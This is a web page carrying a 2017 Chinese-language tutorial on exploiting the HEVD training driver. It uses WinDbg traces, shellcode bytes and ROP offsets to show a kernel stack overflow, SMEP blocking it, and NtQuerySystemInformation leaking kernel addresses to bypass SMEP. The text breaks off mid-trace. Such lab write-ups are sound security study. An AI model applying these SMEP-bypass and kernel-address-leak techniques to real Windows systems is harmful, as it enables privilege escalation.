@@ -1,0 +1,759 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】HEVD内核漏洞训练之SMEP绕过 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="SMEP"/>
+    
+        <meta name="description" content="在本文中，我对一种常见的获取内核信息的函数NtQuerySystemInformation进行了跟踪分析，对几种绕过SMEP的方法也进行了一些跟踪，感觉与系统博弈的过程还是艰辛又好玩的，做了一些总结然后和大家一起分享。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】HEVD内核漏洞训练之SMEP绕过</h2>
+                <div class="article-msg">
+                    <span class="time">2017-03-07 10:18:10</span>
+                    
+                                        <span class="read">阅读：12924次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3570"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3570" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://whereisk0shl.top/HEVD-with-SMEP-bypass.html"
+                             target="_blank">来源： whereisk0shl.top</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p0.qhimg.com/t01b42f0d220c2afe1d.jpg" title="t01cc07015b0e46d661.jpg" alt="http://p5.qhimg.com/t01cc07015b0e46d661.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">传送门</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><a href="http://bobao.360.cn/learning/detail/3544.html" target="_self" style="text-indent: 2em; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">【技术分享】HEVD内核漏洞训练——陪Windows玩儿</span></strong></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x00 前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这篇的内容比较基础，也比较好玩，当然，一直看到袁哥提到的DVE bypass mitigation的，关于DVE感觉非常神奇，不过我还是不太了解，非常想学。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前两天在安全客发了一篇HEVD内核漏洞训练的文章，其中主要和大家分享了一下我的偶像MJ0011在HITCON上提到的Windows 8之后的新防护机制。后来Cn33liz又更新了一个HEVD Kernel StackOverflow的exp，正好提到了SMEP Bypass。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Cn33liz exp地址：<a href="https://github.com/Cn33liz/HSEVD-StackOverflowX64" _src="https://github.com/Cn33liz/HSEVD-StackOverflowX64">https://github.com/Cn33liz/HSEVD-StackOverflowX64</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而SMEP Bypass相关的show case有一个非常好的文章在： https://www.coresecurity.com/system/files/publications/2016/05/Windows SMEP bypass U-S.pdf&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里我尝试了文中提到的几种bypass SMEP的方法进行了尝试，和大家一起分享一下这个过程，在此之前想和大家说一下之前的一些误区。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先在上一篇HEVD内核漏洞训练中，我提到关于NtAllocateVirtualMemory返回STATUS_SUCCESS之后仍然无法申请内存的问题，当时描述出了问题－－实际上，当NtAllocateVirtualMemory返回STATUS_SUCCESS之后内存已经是可以申请的了，只需要通过memset初始化内存即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">经过和安全客小编的沟通，已经在文中修改了这处错误，实在抱歉！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二点是关于Cn33liz的exploit中，在他构造rop chain的时候，覆盖的地址偏移是2072，我发现这个地址并非是ret address，而是2088这个偏移才能够将rop chain的地址覆盖上。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">上一篇在安全客的地址：<a href="http://bobao.360.cn/learning/detail/3544.html" _src="http://bobao.360.cn/learning/detail/3544.html">http://bobao.360.cn/learning/detail/3544.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在本文中，我对一种常见的获取内核信息的函数NtQuerySystemInformation进行了跟踪分析，对几种绕过SMEP的方法也进行了一些跟踪，感觉与系统博弈的过程还是艰辛又好玩的，做了一些总结然后和大家一起分享。请师傅们多多交流指正。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t016a13515cf177d822.png" title="t016a13515cf177d822.png" alt="http://p4.qhimg.com/t016a13515cf177d822.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x01 SMEP</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">SMEP有点像DEP，是内核的一种缓解措施，我们可以将它简单的理解成禁止在内核态下执行用户空间的代码，下面我们来看一下SMEP的作用，首先通过VirtualAlloc申请用户态空间，并将shellcode拷贝至空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;g
+Break&nbsp;instruction&nbsp;exception&nbsp;-&nbsp;code&nbsp;80000003&nbsp;(first&nbsp;chance)
+0033:00007ff7`fcde14d0&nbsp;cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
+kd&gt;&nbsp;p
+0033:00007ff7`fcde14d1&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+kd&gt;&nbsp;dd&nbsp;e50000//VirtualAlloc&nbsp;申请e50000内存，并部署shellcode
+00000000`00e50000&nbsp;&nbsp;148b4865&nbsp;00018825&nbsp;828b4c00&nbsp;000000b8
+00000000`00e50010&nbsp;&nbsp;e8888b4d&nbsp;49000002&nbsp;8b48098b&nbsp;8348f851
+00000000`00e50020&nbsp;&nbsp;057404fa&nbsp;eb098b48&nbsp;418b48f1&nbsp;49f02460
+d&gt;&nbsp;g//memcpy的时候中断调试，rsi向rdi内存拷贝畸形字符串
+Breakpoint&nbsp;0&nbsp;hit
+HEVD!TriggerStackOverflow+0xdf:
+fffff800`02280bbf&nbsp;f3a4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;byte&nbsp;ptr&nbsp;[rdi],byte&nbsp;ptr&nbsp;[rsi]
+kd&gt;&nbsp;bp&nbsp;fffff80002280bc1
+kd&gt;&nbsp;r&nbsp;rsi
+rsi=0000000000fe35d0
+kd&gt;&nbsp;dd&nbsp;fe35d0//查看寄存器覆盖情况
+00000000`00fe35d0&nbsp;&nbsp;90909090&nbsp;90909090&nbsp;90909090&nbsp;90909090</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，在HEVD中调用memcpy之后，会覆盖到内核栈中的返回地址，在ret返回的时候，会由于栈溢出，跳转到我们之前部署的shellcode的地址e50000位置，这是用户态空间，SMEP开始工作了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;!analyze&nbsp;-v//SMEP引发BSOD，ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY
+*******************************************************************************
+*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
+*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bugcheck&nbsp;Analysis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
+*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
+*******************************************************************************
+ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY&nbsp;(fc)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SMEP会导致BSOD，报错内容是ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01f19bd5b281be20e6.png" title="t01f19bd5b281be20e6.png" alt="http://p4.qhimg.com/t01f19bd5b281be20e6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x02 NtQuerySystemInformation的工作</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">正如开始的时候我说SMEP有点像DEP，绕过DEP比较常见的方法就是ROP，因此对抗SMEP的常见方法也是比较简单的方法也是ROP，在DEP中构造ROP需要dll的基址，其实在SMEP中构造ROP需要动态链接库内核的地址，而获取内核地址的一种非常好用的方法就是NtQuerySystemInformation。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，这个函数在Medium Integrity下是可以工作的，但是在Low Integrity下是无法获取内核信息的，不过基本都是在Medium Integrity下进行的，只有在微软的一些沙盒中是不能用的，要用其他方法来泄露内核地址。（还记得bitmap吗！也是GdiSharedHandleTable不能用之后改用了gsharedinfo）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先来看一下NtQuerySystemInformation的工作，先从用户态进入内核态，在64位下通过syscall进入。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">ntdll!NtQuerySystemInformation:
+0033:00007ffe`33f17e30&nbsp;4c8bd1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r10,rcx
+0033:00007ffe`33f17e33&nbsp;b835000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,35h
+0033:00007ffe`33f17e38&nbsp;0f05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall//通过syscall进入内核态
+0033:00007ffe`33f17e3a&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在NtQuerySystemInformation传入参数中，第一个表示功能号，这里我们使用的是功能号为11。在NtQuerySystemInformation中会对功能号进行判断，当功能号为11的时候，会执行一些函数调用进行相应的逻辑处理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;g
+Breakpoint&nbsp;1&nbsp;hit
+nt!NtQuerySystemInformation://进入内核态&nbsp;nt!NtQuerySystemInformation
+fffff801`dc7d1390&nbsp;4053&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;rbx
+kd&gt;&nbsp;r&nbsp;rcx//系统功能号&nbsp;11
+rcx=000000000000000b
+kd&gt;&nbsp;g
+Breakpoint&nbsp;2&nbsp;hit//采取ecx自减的方法，当ecx为0命中功能号
+nt!ExpQuerySystemInformation+0x541:
+fffff801`dc7d196d&nbsp;ffc9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x543:
+fffff801`dc7d196f&nbsp;0f85dc9f1700&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x1bd51&nbsp;(fffff801`dc94b951)
+kd&gt;&nbsp;r&nbsp;ecx//此时，ecx为0，进入功能号为11的逻辑处理
+ecx=0
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x549:
+fffff801`dc7d1975&nbsp;418acb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cl,r11b
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x54c:
+fffff801`dc7d1978&nbsp;e863800d00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;nt!ExIsRestrictedCaller&nbsp;(fffff801`dc8a99e0)//检查是否是受限调用
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x551://返回值eax
+fffff801`dc7d197d&nbsp;85c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x553:
+fffff801`dc7d197f&nbsp;0f8547a01700&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x1bdcc&nbsp;(fffff801`dc94b9cc)
+kd&gt;&nbsp;r&nbsp;eax//&nbsp;eax为0，非受限调用，可以继续执行下面的获取nt的基址的逻辑
+eax=0
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x559://gs指向_kpcr
+fffff801`dc7d1985&nbsp;65488b042588010000&nbsp;mov&nbsp;&nbsp;&nbsp;rax,qword&nbsp;ptr&nbsp;gs:[188h]
+kd&gt;&nbsp;dt&nbsp;nt!_KPCR
+&nbsp;&nbsp;&nbsp;+0x180&nbsp;Prcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_KPRCB
+kd&gt;&nbsp;dt&nbsp;nt!_KPRCB
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;CurrentThread&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Ptr64&nbsp;_KTHREAD</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在功能号为11的逻辑处理中，主要获取内核模块信息的函数是ExpQuerySystemInformation，这个函数中，首先会获得内核的KTHREAD信息，保存至rax中，gs指向kpcr，偏移180h的位置是kprcb，偏移再加8h则指向KTHREAD。接下来会将KernelApcDisable置true。然后会锁定获取资源。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x562://KTHREAD+1E4位置自减，就是KernelApcDisable自减
+fffff801`dc7d198e&nbsp;66ff88e4010000&nbsp;&nbsp;dec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word&nbsp;ptr&nbsp;[rax+1E4h]
+kd&gt;&nbsp;r&nbsp;rax
+rax=ffffe00001cac880
+kd&gt;&nbsp;!process
+PROCESS&nbsp;ffffe00001252900
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;THREAD&nbsp;ffffe00001cac880&nbsp;
+kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;KernelApcDisable
+&nbsp;&nbsp;&nbsp;+0x1e4&nbsp;KernelApcDisable&nbsp;:&nbsp;Int2B
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x569:
+fffff801`dc7d1995&nbsp;418ad5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dl,r13b
+kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;KernelApcDisable&nbsp;ffffe00001cac880
+&nbsp;&nbsp;&nbsp;+0x1e4&nbsp;KernelApcDisable&nbsp;:&nbsp;0n-1
+&nbsp;&nbsp;&nbsp;kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x56c:
